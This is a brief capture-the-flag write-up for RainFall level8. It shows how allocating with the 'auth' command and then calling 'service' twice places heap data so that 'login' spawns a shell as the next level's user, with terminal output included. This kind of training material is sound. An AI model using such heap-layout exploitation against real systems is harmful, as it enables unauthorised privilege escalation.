### The program wait for one of the command

    - auth
    - service
    - reset
    - login

The goal is to set the auth variable value to 32

```
*auth + 32 != 0
```


```
level8@RainFall:~$ ./level8
(nil), (nil)
auth 
0x804a008, (nil)
service
0x804a008, 0x804a018
```

After this combination of commands the padding between auth and service are 16. This means that these pointers are located one after the other
To get 32 offset we just need to use service command twice after auth


```
level8@RainFall:~$ ./level8 
(nil), (nil) 
 auth
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ whoami
level9
```